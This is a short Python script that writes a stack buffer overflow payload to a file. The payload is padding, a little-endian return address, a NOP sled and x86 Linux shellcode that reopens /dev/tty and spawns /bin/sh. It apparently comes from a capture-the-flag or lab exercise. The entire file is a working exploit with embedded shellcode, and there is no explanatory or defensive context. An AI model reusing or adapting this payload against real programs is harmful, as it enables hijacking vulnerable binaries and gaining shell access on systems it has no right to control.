import ctypes
import sys

input_string = "ffffd576"
little_endian_bytes = bytes.fromhex(input_string)[::-1]
#print(little_endian_bytes)
if len(sys.argv) != 2:
    print("Usage: python script_name.py <argument>")
    sys.exit(1)
    
input_file=  sys.argv[1]
with open(input_file, 'r') as file:
    char_string  = file.read().encode()
# Concatenate the bytes with the rest of your byte
output_bytes = b'A' * 16 + little_endian_bytes + b"\x90"* 400 + b'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x96\x91\x04\x08'
with open("shell_string", "wb") as f:
    f.write(output_bytes)

print("Output file 'shell_string' created successfully.")